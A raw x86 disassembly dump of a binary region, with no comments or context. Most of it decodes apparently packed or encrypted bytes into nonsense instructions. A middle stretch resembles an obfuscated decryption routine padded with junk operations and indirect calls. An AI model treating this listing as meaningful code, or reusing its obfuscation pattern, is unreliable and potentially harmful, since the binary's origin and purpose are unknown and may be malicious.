  4032d1:	jl     0x403318
  4032d3:	mov    ah,0xc0
  4032d5:	dec    ebp
  4032d6:	les    eax,FWORD PTR [esi-0x10]
  4032d9:	popf   
  4032da:	mov    al,ds:0xb6200343
  4032df:	enter  0xa2e8,0x58
  4032e3:	cld    
  4032e4:	ret    
  4032e5:	pop    ecx
  4032e6:	add    ch,BYTE PTR [ebp+0x6fe73dd9]
  4032ec:	pop    ebp
  4032ed:	mov    dh,0xa3
  4032ef:	sahf   
  4032f0:	mov    BYTE PTR [ebx],0xae
  4032f3:	and    esi,DWORD PTR [edi-0x81f9e25]
  4032f9:	scas   eax,DWORD PTR es:[edi]
  4032fa:	xchg   ebx,eax
  4032fb:	stc    
  4032fc:	mov    dl,0xf9
  4032fe:	add    cl,0x2c
  403301:	mov    ds:0x9e5bb5b1,al
  403306:	lds    eax,FWORD PTR ds:0x8ae11627
  40330c:	fldenv [edi+0x5f]
  40330f:	jbe    0x4032ec
  403311:	rcr    DWORD PTR [edx-0x43a23456],0x94
  403318:	pop    eax
  403319:	out    0x7e,al
  40331b:	xchg   esp,eax
  40331c:	js     0x4032a5
  40331e:	jmp    0x403374
  403320:	aam    0x4d
  403322:	es das 
  403324:	jge    0x403335
  403326:	sub    BYTE PTR [ebx],dl
  403328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403329:	xor    BYTE PTR [eax-0x563888bc],0x75
  403330:	jne    0x4033a4
  403332:	cmp    dh,bl
  403334:	(bad)  
  403335:	push   esi
  403336:	test   BYTE PTR [ebp+0x5a],bl
  403339:	out    0x17,al
  40333b:	test   al,0x8a
  40333d:	test   eax,0xff138204
  403342:	enter  0xa921,0xcc
  403346:	pushf  
  403347:	outs   dx,DWORD PTR ds:[esi]
  403348:	and    ebp,DWORD PTR [ecx-0xa]
  40334b:	lds    edx,FWORD PTR [bp+si]
  40334e:	pop    es
  40334f:	push   cs
  403350:	fmul   DWORD PTR [edx-0x211d5cd1]
  403356:	pusha  
  403357:	sti    
  403358:	jo     0x40330a
  40335a:	(bad)  
  40335b:	mov    esp,0x75d985ef
  403360:	(bad)  
  403361:	adc    BYTE PTR [eax+0x6773e507],ah
  403367:	in     eax,dx
  403368:	in     al,0x3a
  40336a:	and    eax,0x4f34cb3f
  40336f:	cmp    eax,esp
  403371:	mov    al,ds:0x18272fe2
  403376:	sbb    edi,eax
  403378:	jbe    0x40330d
  40337a:	retf   
  40337b:	dec    edx
  40337c:	les    ebp,FWORD PTR [edi+0x35805d55]
  403382:	outs   dx,BYTE PTR ds:[esi]
  403383:	mov    edi,0xf111360c
  403388:	fucomip st,st(5)
  40338a:	xchg   ebp,eax
  40338b:	stos   BYTE PTR es:[edi],al
  40338c:	jns    0x40337a
  40338e:	pop    ss
  40338f:	dec    ecx
  403390:	shl    DWORD PTR [eax+ebx*4],cl
  403393:	test   BYTE PTR [edi-0x3f],0xb7
  403397:	adc    bl,BYTE PTR [edi-0x10]
  40339a:	jg     0x40340b
  40339c:	sbb    al,0xa1
  40339e:	push   0xffffffed
  4033a0:	inc    ebp
  4033a1:	dec    edx
  4033a2:	scas   al,BYTE PTR es:[edi]
  4033a3:	xchg   edx,eax
  4033a4:	lds    eax,FWORD PTR [ebp+0x3d]
  4033a7:	xor    eax,0xa5b989d4
  4033ac:	mov    al,dh
  4033ae:	into   
  4033af:	retf   0x83ab
  4033b2:	push   ecx
  4033b3:	adc    edi,DWORD PTR [ebp-0x1f]
  4033b6:	push   edx
  4033b7:	or     DWORD PTR [ecx+0x37178a49],ecx
  4033bd:	mov    ds:0x86e8f971,al
  4033c2:	sbb    esi,0x10cc97b3
  4033c8:	stos   BYTE PTR es:[edi],al
  4033c9:	pop    ebp
  4033ca:	xor    ecx,DWORD PTR [eax+ebx*2-0x2b50b4f]
  4033d1:	lds    edi,FWORD PTR [ebx-0x69]
  4033d4:	sub    BYTE PTR [ebp+ebx*1-0x3f],ah
  4033d8:	nop
  4033d9:	cmp    ebx,esi
  4033db:	mov    al,0x4c
  4033dd:	sar    DWORD PTR [ecx],cl
  4033df:	mov    ds:0x370d9e42,al
  4033e4:	or     eax,ebp
  4033e6:	mov    ebp,0x25ae2ac1
  4033eb:	dec    esp
  4033ec:	fdiv   QWORD PTR [esi-0x7cbff49a]
  4033f2:	(bad)  
  4033f3:	cld    
  4033f4:	nop
  4033f5:	push   esi
  4033f6:	arpl   WORD PTR [ebp+0x6ea65412],dx
  4033fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033fd:	test   DWORD PTR [ecx],0x3fa1b5c1
  403403:	pusha  
  403404:	lods   eax,DWORD PTR ds:[esi]
  403405:	(bad)  
  403408:	mov    edx,0x456a243d
  40340d:	cli    
  40340e:	and    cl,al
  403410:	bound  ebx,QWORD PTR [eax+0xfc4b84]
  403416:	ret    
  403417:	push   edi
  403418:	sub    al,0x91
  40341a:	cmp    DWORD PTR [ebx+0x5de5cd],ebx
  403420:	lods   eax,DWORD PTR ds:[esi]
  403421:	aad    0x18
  403423:	iret   
  403424:	and    ch,BYTE PTR [eax]
  403426:	and    cl,bl
  403428:	loop   0x4033b0
  40342a:	in     al,dx
  40342b:	dec    ebx
  40342c:	xchg   edx,eax
  40342d:	aad    0x94
  40342f:	and    bh,al
  403431:	(bad)  
  403432:	or     al,0x3b
  403434:	(bad)  
  403435:	jl     0x40347c
  403437:	jecxz  0x403416
  403439:	xchg   esp,eax
  40343a:	ficomp DWORD PTR [eax]
  40343c:	mov    BYTE PTR [edi],al
  40343e:	(bad)
  403443:	test   al,0x86
  403445:	mul    ebp
  403447:	rol    DWORD PTR [esi+0x20],1
  40344a:	out    0x5c,al
  40344c:	stos   DWORD PTR es:[edi],eax
  40344d:	mov    esp,0x35272e74
  403452:	jle    0x403459
  403454:	mov    edi,0xa75ea8cf
  403459:	sbb    BYTE PTR [esi+0x5d],al
  40345c:	mov    ds:0xe732c512,al
  403461:	out    dx,al
  403462:	jmp    0xee09bad9
  403467:	sub    edi,ebx
  403469:	pop    eax
  40346a:	jne    0x403488
  40346c:	xor    DWORD PTR [edx-0x3b],ebx
  40346f:	sub    edx,DWORD PTR [ecx-0x32]
  403472:	xor    BYTE PTR [ebx-0x6bb3d98b],0x95
  403479:	push   edx
  40347a:	xchg   ebx,eax
  40347b:	sbb    bh,cl
  40347d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40347e:	test   eax,0xde4b5d23
  403483:	in     eax,0x5f
  403485:	enter  0xc4e1,0x4c
  403489:	ret    0x99a5
  40348c:	call   0xcd1c:0x7da54679
  403493:	adc    DWORD PTR [eax],ecx
  403495:	js     0x4034ac
  403497:	(bad)  
  403498:	adc    al,0x5a
  40349a:	jne    0x403497
  40349c:	mov    eax,ds:0x61ae0b74
  4034a1:	and    eax,DWORD PTR [esi]
  4034a3:	fcom   st(5)
  4034a5:	jne    0x4034be
  4034a7:	dec    ebp
  4034a8:	test   esp,esi
  4034aa:	inc    ecx
  4034ab:	mov    eax,0xfb0aaed7
  4034b0:	std    
  4034b1:	ret    0x6dbd
  4034b4:	pop    es
  4034b5:	mov    ecx,0xe8a64f85
  4034ba:	es test al,0xc1
  4034bd:	mov    ds:0x11616740,eax
  4034c2:	mov    bh,0x65
  4034c4:	(bad)  
  4034c5:	jmp    0xcc9b:0x7861fb23
  4034cc:	mov    dl,dl
  4034ce:	ret    0x9d01
  4034d1:	cmp    eax,0x43f6a2b0
  4034d6:	cwde   
  4034d7:	or     al,0x28
  4034d9:	icebp  
  4034da:	je     0x403496
  4034dc:	hlt    
  4034dd:	add    al,0x73
  4034df:	aam    0x3a
  4034e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034e2:	xlat   BYTE PTR ds:[ebx]
  4034e3:	fs mov eax,0x23a7a7ad
  4034e9:	push   edx
  4034ea:	enter  0x4a0a,0x8b
  4034ee:	dec    ebp
  4034ef:	in     al,dx
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x4281a3,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx+0x29],ch
  403514:	adc    DWORD PTR [ebp+0x18e5c3b0],edi
  40351a:	sbb    BYTE PTR [esi-0x7ee7e7ee],bl
  403520:	sti    
  403521:	mov    al,ds:0xcc8bc331
  403526:	sbb    eax,0x98b02156
  40352b:	xchg   edx,eax
  40352c:	cwde   
  40352d:	mov    ecx,0x28e7e060
  403532:	or     eax,0x14
  403535:	pop    es
  403536:	mov    bl,BYTE PTR [bp-0x2d]
  40353a:	xchg   esp,eax
  40353b:	sbb    eax,0x3e9bfd27
  403540:	cdq    
  403541:	je     0x403529
  403543:	mov    dh,0x50
  403545:	jge    0x40350d
  403547:	in     al,0x35
  403549:	retf   
  40354a:	test   eax,0xcfcbb3b4
  40354f:	aam    0x9
  403551:	jbe    0x4034e2
  403553:	xlat   BYTE PTR ds:[ebx]
  403554:	mov    eax,0x27dd8b06
  403559:	jmp    0xc950:0xd3566ce7
  403560:	lods   al,BYTE PTR ds:[esi]
  403561:	out    0x40,al
  403563:	aas    
  403564:	mov    ebp,0xde9f0c5c
  403569:	add    al,0x6e
  40356b:	push   ebp
  40356c:	test   al,0x77
  40356e:	add    cl,bh
  403570:	call   0x6f5:0xddb9eae5
  403577:	das    
  403578:	cs jl  0x403523
  40357b:	inc    ecx
  40357c:	add    eax,0x45254096
  403581:	jl     0x4035a3
  403583:	(bad)  
  403584:	jne    0x40352a
  403586:	pop    eax
  403587:	or     dl,BYTE PTR cs:[eax+0x9]
  40358b:	int3   
  40358c:	call   DWORD PTR [edx-0x7f]
  40358f:	xlat   BYTE PTR ds:[ebx]
  403590:	jmp    0xa4221555
  403595:	xlat   BYTE PTR ds:[ebx]
  403596:	(bad)  
  403597:	fmul   st(6),st
  403599:	cmp    eax,0xddfedac4
  40359e:	cmc    
  40359f:	sbb    DWORD PTR [esi+0x83b5ed0],edi
  4035a5:	punpcklbw mm6,DWORD PTR [ecx]
  4035a8:	mov    bl,0x5e
  4035aa:	mov    eax,0xc5a3daca
  4035af:	je     0x403568
  4035b1:	dec    eax
  4035b2:	pop    ecx
  4035b3:	sub    al,0x3c
  4035b5:	sub    BYTE PTR [ecx-0x2b2f69b1],0xc2
  4035bc:	(bad)  
  4035bd:	and    al,0x8d
  4035bf:	int3   
  4035c0:	or     DWORD PTR [esi+ebx*2-0xc],esi
  4035c4:	out    dx,al
  4035c5:	pushf  
  4035c6:	dec    bp
  4035c8:	ror    BYTE PTR [ebx],0x63
  4035cb:	call   0xd84e201e
  4035d0:	mov    eax,ds:0x36da0270
  4035d5:	loope  0x4035f2
  4035d7:	in     eax,dx
  4035d8:	and    eax,0x936eff23
  4035dd:	bound  edi,QWORD PTR [eax]
  4035df:	ins    BYTE PTR es:[edi],dx
  4035e0:	mov    ds:0x29dc4740,eax
  4035e5:	mov    ebx,0x1466a9a6
  4035ea:	inc    edi
  4035eb:	or     cl,BYTE PTR [esi]
  4035ed:	sar    BYTE PTR [edi],1
  4035ef:	dec    edx
  4035f0:	xchg   ebx,eax
  4035f1:	mov    edx,0x55620bee
  4035f6:	sbb    bh,BYTE PTR [ecx+0x4d]
  4035f9:	sub    bh,ah
  4035fb:	rcl    ecx,0xd
  4035fe:	out    0x95,eax
  403600:	popa   
  403601:	push   eax
  403602:	rol    BYTE PTR [ebp+0x3ece777c],1
  403608:	adc    al,0x4b
  40360a:	push   ss
  40360b:	dec    ebp
  40360c:	imul   edx,DWORD PTR [edi-0x35],0xbd7f36c1
  403613:	xchg   ecx,eax
  403614:	inc    esp
  403615:	and    ebp,edi
  403617:	stc    
  403618:	fucomi st,st(3)
  40361a:	adc    ebx,DWORD PTR [edi+ebp*8+0x27]
  40361e:	(bad)  
  40361f:	loope  0x403695
  403621:	adc    esp,eax
  403623:	ja     0x403637
  403625:	xor    cl,al
  403627:	je     0x403643
  403629:	shl    al,0xbc
  40362c:	mov    cl,0xd8
  40362e:	jl     0x403660
  403630:	enter  0x4311,0x29
  403634:	jg     0x4035fc
  403636:	dec    esi
  403637:	push   ds
  403638:	push   edi
  403639:	jle    0x40360f
  40363b:	cmp    ch,BYTE PTR es:0x3eb16a2e
  403642:	dec    ecx
  403643:	sub    edx,edx
  403645:	std    
  403646:	(bad)  
  403647:	jns    0x403661
  403649:	stos   BYTE PTR es:[edi],al
  40364a:	arpl   WORD PTR [edx-0x18afc3e4],bx
  403650:	pop    esi
  403651:	xor    al,bl
  403653:	inc    ebp
  403654:	stc    
  403655:	popa   
  403656:	gs call 0x6fe5ffc7
  40365c:	aam    0x98
  40365e:	fcom   QWORD PTR [ebp+0x7e]
  403661:	jle    0x403692
  403663:	or     al,ch
  403665:	in     eax,0xe2
  403667:	aas    
  403668:	and    DWORD PTR [ebx-0x1da11a5d],0x4840023d
  403672:	lods   al,BYTE PTR ds:[esi]
  403673:	mov    eax,ds:0xd0971a4d
  403678:	xor    eax,0xc7a0b929
  40367d:	sub    esi,ebp
  40367f:	lds    edx,FWORD PTR [ebx-0x4b]
  403682:	sahf   
  403683:	fidivr WORD PTR [eax-0x4]
  403686:	aam    0x86
  403688:	mov    cl,0x72
  40368a:	in     eax,0xc5
  40368c:	mov    cl,0xa7
  40368e:	cmp    eax,0x4f58a4b6
  403693:	inc    esi
  403694:	or     DWORD PTR [eax],esi
  403696:	enter  0x4572,0xfc
  40369a:	inc    esi
  40369b:	call   0x56e569fa
  4036a0:	pop    edx
  4036a1:	fcomi  st,st(2)
  4036a3:	sub    eax,0xb703bae4
  4036a8:	cli    
  4036a9:	icebp  
  4036aa:	pop    ss
  4036ab:	xchg   esp,eax
  4036ac:	mov    dh,0xf6
  4036ae:	sub    ecx,DWORD PTR [ebx-0x76]
  4036b1:	add    al,0xc8
  4036b3:	rol    DWORD PTR [edi-0x54d0ca46],cl
  4036b9:	xchg   esi,eax
  4036ba:	add    al,0xcf
  4036bc:	sub    esi,DWORD PTR [ebp+0x26]
  4036bf:	mov    cs,WORD PTR [edx-0x7766ea32]
  4036c5:	out    0xe,eax
  4036c7:	mov    cs,WORD PTR [eax]
  4036c9:	push   edi
  4036ca:	gs push edx
  4036cc:	retf   
  4036cd:	test   eax,0xff20fda4
  4036d2:	mov    ah,bl
  4036d4:	retf   
  4036d5:	xchg   esi,eax
  4036d6:	mov    cl,0x8c
  4036d8:	mov    edi,0x7f2ff24c
  4036dd:	adc    BYTE PTR [ecx+0x6b],al
  4036e0:	jle    0x4036ee
  4036e2:	dec    edx
  4036e3:	sbb    al,0x23
  4036e5:	out    dx,al
  4036e6:	div    BYTE PTR [edi-0x31]
  4036e9:	push   esp
  4036ea:	push   ds
  4036eb:	scas   eax,DWORD PTR es:[edi]
  4036ec:	xchg   esi,eax
  4036ed:	aaa    
  4036ee:	push   esi
  4036ef:	pop    edi
  4036f0:	(bad)  
  4036f1:	add    ch,dh
  4036f3:	dec    edx
  4036f4:	pop    edx
  4036f5:	pusha  
  4036f6:	or     eax,0x352c13c0
  4036fb:	scas   eax,DWORD PTR es:[edi]
  4036fc:	jmp    0x403702
  4036fe:	ds sub al,0x49
  403702:	xchg   ecx,eax
  403703:	dec    esp
  403704:	(bad)  
  403705:	clc    
  403706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403707:	mov    ebx,0x79658e6b
  40370c:	jae    0x40371f
  40370e:	jg     0x403755
  403710:	inc    ebp
  403711:	sub    eax,edi
  403713:	imul   ecx,DWORD PTR [ebx-0x59],0x4c
  403717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403718:	jb     0x4036e6
  40371a:	dec    ebx
  40371b:	mov    edi,0xe9141517
  403720:	fcomp  DWORD PTR [ecx-0x39764b55]
  403726:	lock call 0x67f6:0xd8d70a6a
  40372e:	mov    dh,cl
  403730:	test   DWORD PTR [edi+0x5d],esp
  403733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403734:	rcl    BYTE PTR [ebx+0x4a],cl
  403737:	das    
  403738:	(bad)  
  40373a:	arpl   WORD PTR [esi+0x239a42d8],dx
  403740:	rol    DWORD PTR [edi-0x28ad4296],0xea
  403747:	mov    eax,0xc64e480d
  40374c:	mov    dh,0x1d
  40374e:	jnp    0x4037b3
  403750:	cmc    
  403751:	ret    
  403752:	xor    al,BYTE PTR [edi+eiz*8]
  403755:	xchg   ebx,eax
  403756:	pop    ebx
  403757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403758:	fcomp  DWORD PTR [ecx+0x2a0132f4]
  40375e:	cmp    BYTE PTR [edi+0x67],dl
  403761:	jne    0x40375a
  403763:	cmp    BYTE PTR [eax+0x73ca5206],ch
  403769:	cwde   
  40376a:	lahf   
  40376b:	sbb    DWORD PTR [ecx+0x527f4c5b],ebp
  403771:	std    
  403772:	jmp    0xa333d1c5
  403777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403778:	lahf   
  403779:	sti    
  40377a:	mov    dh,0x8e
  40377c:	xor    ebp,DWORD PTR [ebx]
  40377e:	lods   eax,DWORD PTR ds:[esi]
  40377f:	cmp    eax,0x40346e19
  403784:	cli    
  403785:	cmp    BYTE PTR [ebp-0x15ac1c41],al
  40378b:	push   ds
  40378c:	shl    BYTE PTR [eax+0x37775a95],0x8
  403793:	sbb    edi,ebx
  403795:	call   0x4c99:0xa76af62e
  40379c:	jmp    0x18bc:0x30406609
  4037a3:	test   ecx,esp
  4037a5:	pushf  
  4037a6:	and    eax,0x74c32f1b
  4037ab:	out    dx,al
  4037ac:	nop
  4037ad:	adc    eax,0xa26127b3
  4037b2:	fs mov dh,0x19
  4037b5:	aas    
  4037b6:	rol    dl,cl
  4037b8:	daa    
  4037b9:	into   
  4037ba:	xchg   edi,eax
  4037bb:	mov    ds:0x47359940,al
  4037c0:	xchg   BYTE PTR [ebx-0x7ab4757a],bl
  4037c6:	loop   0x40378b
  4037c8:	inc    ebx
  4037c9:	pop    ebp
  4037ca:	dec    eax
  4037cb:	std    
  4037cc:	inc    ebp
  4037cd:	push   ebp
  4037ce:	mov    BYTE PTR [eax+ecx*1],bl
  4037d1:	out    dx,eax
  4037d2:	sub    bh,BYTE PTR [ebx+0x42]
  4037d5:	arpl   WORD PTR fs:[ebp+0x5],dx
  4037d9:	sub    edx,DWORD PTR [esi+0xc5e4408]
  4037df:	dec    edx
  4037e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037e1:	mul    DWORD PTR [edi]
  4037e3:	push   esi
  4037e4:	pop    ss
  4037e5:	adc    edx,DWORD PTR [ebx+eiz*1]
  4037e8:	in     eax,dx
  4037e9:	xchg   ebp,eax
  4037ea:	pop    ds
  4037eb:	sahf   
  4037ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037ed:	add    al,0xa9
  4037ef:	aas    
  4037f0:	icebp  
  4037f1:	or     DWORD PTR [edi-0x66af69aa],edi
  4037f7:	dec    edi
  4037f8:	cli    
  4037f9:	dec    ebp
  4037fa:	mov    cl,0xb5
  4037fc:	sbb    eax,0xd99c3b76
  403801:	fstp   QWORD PTR [edi+0x7f2a3255]
  403807:	dec    ebx
  403808:	sub    bl,dl
  40380a:	outs   dx,BYTE PTR ds:[esi]
  40380b:	das    
  40380c:	in     eax,0x7c
  40380e:	out    dx,eax
  40380f:	mov    eax,ds:0xfd3bda6b
  403814:	push   0xea79bfea
  403819:	mov    ds:0x3036ad40,eax
  40381e:	pinsrw mm2,WORD PTR ds:0x631afcba,0x0
  403826:	sbb    edi,0xb5518f5b
  40382c:	nop
  40382d:	cli    
  40382e:	push   esp
  40382f:	cwde   
  403830:	aad    0xe
  403832:	rol    DWORD PTR [edx],cl
  403834:	in     eax,0x2e
  403836:	sub    ebp,ebx
  403838:	push   es
  403839:	jp     0x40385e
  40383b:	jae    0x40389c
  40383d:	cmc    
  40383e:	jb     0x40388a
  403840:	clc    
  403841:	fs (bad) 
  403844:	test   al,0xdf
  403846:	push   ss
  403847:	sub    bh,BYTE PTR [ebp+0x58]
  40384a:	nop
  40384b:	fcom   QWORD PTR [edx-0x1e]
  40384e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40384f:	iret   
  403850:	sub    DWORD PTR [edx+0x46e62411],eax
  403856:	mov    dh,0xcf
  403858:	cmp    esi,DWORD PTR [ebp+0x7a]
  40385b:	sbb    bh,dh
  40385d:	jecxz  0x4038d2
  40385f:	jb     0x40381a
  403861:	xchg   ecx,eax
  403862:	xor    bl,BYTE PTR [edx]
  403864:	dec    eax
  403865:	push   0x1f
  403867:	push   ebp
  403868:	mov    ds:0xf9d31982,al
  40386d:	push   cs
  40386e:	mov    dl,0x54
  403870:	cli    
  403871:	fisttp DWORD PTR [ecx+0x74f8080c]
  403877:	into   
  403878:	retf   0xa252
  40387b:	iret   
  40387c:	ja     0x403886
  40387e:	jbe    0x4038d6
  403880:	jecxz  0x403848
  403882:	mov    ebp,0x4e131d57
  403887:	pop    edx
  403888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403889:	xchg   esp,eax
  40388a:	mov    ecx,0xa4083898
  403890:	mov    dl,dl
  403892:	mul    DWORD PTR [ecx-0x17]
  403895:	loopne 0x4038b0
  403897:	or     DWORD PTR [ecx+0x6e],ecx
  40389a:	lea    ecx,[eax]
  40389c:	arpl   WORD PTR [eax-0x218f86c2],ax
  4038a2:	jns    0x40391e
  4038a4:	cmp    bl,bh
  4038a6:	push   ecx
  4038a7:	dec    esp
  4038a8:	fwait
  4038a9:	sbb    al,ah
  4038ab:	or     al,BYTE PTR [edi]
  4038ad:	push   ebx
  4038ae:	sbb    DWORD PTR [ebx+0x2b],ecx
  4038b1:	add    al,0x9c
  4038b3:	pop    ds
  4038b4:	xor    al,0x1f
  4038b6:	sbb    DWORD PTR [esi+0x234a8d98],esp
  4038bc:	test   al,0x2f
  4038be:	inc    ecx
  4038bf:	dec    ebp
  4038c0:	and    BYTE PTR [ebx],al
  4038c2:	jnp    0x40391f
  4038c4:	and    edi,DWORD PTR [ebp+0x24e7a9a]
  4038ca:	jns    0x403913
  4038cc:	sbb    edx,DWORD PTR [edx+ebp*4+0x1d]
  4038d0:	std    
  4038d1:	repz ds pop edx
  4038d4:	mov    ecx,DWORD PTR [edx+0x3781bd51]
  4038da:	lds    ebp,FWORD PTR [ebx-0x7c]
  4038dd:	ret    0x2fb1
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	cmp    DWORD PTR ds:0x4282a3,0x0
  4038ea:	not    DWORD PTR ds:0x42819b
  4038f0:	mov    ecx,DWORD PTR ds:0x4282c7
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x4282a3,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428f18
  403913:	xor    edx,DWORD PTR ds:0x42828f
  403919:	neg    DWORD PTR ds:0x4282a3
  40391f:	xor    DWORD PTR ds:0x428197,0x12a5
  403929:	and    DWORD PTR ds:0x4283e7,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x4282cb
  403939:	or     ecx,DWORD PTR ds:0x42827f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x4281a3,0x0
  403949:	mov    DWORD PTR ds:0x4283e7,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x4281a3,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428dec
  40397f:	adc    DWORD PTR ds:0x4282d7,0x4281bf
  403989:	sbb    DWORD PTR ds:0x4282c3,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x4283c3
  403999:	or     DWORD PTR ds:0x42829f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x4282c7
  4039a7:	adc    edx,DWORD PTR ds:0x4282ab
  4039ad:	mov    DWORD PTR ds:0x4282c7,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42827f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x4282e7,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x4282db,0x4283e7
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x4281bb
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428197,0x42835f
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x4281a3,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42819b,0x428333
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x4282af,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x4282c7,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428197,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x4282c3,0x0
  403a3e:	mov    DWORD PTR ds:0x42834f,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x4283e7
  403a57:	cmp    DWORD PTR ds:0x4282c3,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428dc8
  403a6f:	mov    edx,DWORD PTR ds:0x42837f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x428413
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x4281c3,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x4281b7,0x2089
  403aa2:	or     DWORD PTR ds:0x42819b,0x113b
  403aac:	mov    eax,ds:0x422410
  403ab1:	cmp    DWORD PTR ds:0x4281c3,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42828f
  403ac3:	mov    DWORD PTR ds:0x428273,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428363,0x6b1a
  403adc:	mov    DWORD PTR ds:0x4281c3,0x1226
  403ae6:	cmp    DWORD PTR ds:0x4281c3,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428163
  403af8:	call   DWORD PTR ds:0x428df0
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42828b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x4282cf,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x4283bb,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x4281ab,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0x6af62c5a
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi+0x76181812],bl
  403b4b:	(bad)  
  403b4c:	xchg   edi,eax
  403b4d:	sub    BYTE PTR [ebp-0x468bd6d],dl
  403b53:	mov    ah,0x9e
  403b55:	fbstp  TBYTE PTR [edx-0x3a8201f5]
  403b5b:	je     0x403ba1
  403b5d:	inc    eax
  403b5e:	jbe    0x403b7c
  403b60:	test   eax,0x892bad1c
  403b65:	adc    DWORD PTR [ebx],esp
  403b67:	loopne 0x403b48
  403b69:	dec    ecx
  403b6a:	xchg   ebx,eax
  403b6b:	or     ebx,DWORD PTR [esi+esi*2+0x76]
  403b6f:	add    cl,bl
  403b71:	mov    bl,0x17
  403b73:	push   eax
  403b74:	fild   QWORD PTR [edi+0x49]
  403b77:	rcl    BYTE PTR [esp+ecx*4+0x39e6adc4],cl
  403b7e:	je     0x403b77
  403b80:	jno    0x403bd1
  403b82:	daa    
  403b83:	mov    al,ds:0xa0e20733
  403b88:	hlt    
  403b89:	aad    0xa5
  403b8b:	lahf   
  403b8c:	adc    BYTE PTR [esi-0x59f6be19],ch
  403b92:	fsubp  st(3),st
  403b94:	arpl   WORD PTR [eax],bx
  403b96:	sahf   
  403b97:	out    0xa6,eax
  403b99:	xchg   esp,eax
  403b9a:	cmp    ah,ch
  403b9c:	pop    ebp
  403b9d:	add    al,0x3f
  403b9f:	adc    esp,DWORD PTR [edi]
  403ba1:	out    0xeb,al
  403ba3:	inc    ebx
  403ba4:	cmp    eax,0x43a46b9a
  403ba9:	fwait
  403baa:	nop
  403bab:	bound  ebx,QWORD PTR [eax-0x64]
  403bae:	ret    0x88b3
  403bb1:	neg    DWORD PTR [edi-0x13]
  403bb4:	(bad)  
  403bb5:	sub    ch,dl
  403bb7:	retf   
  403bb8:	and    bh,BYTE PTR [edx+eax*1-0x21]
  403bbc:	iret   
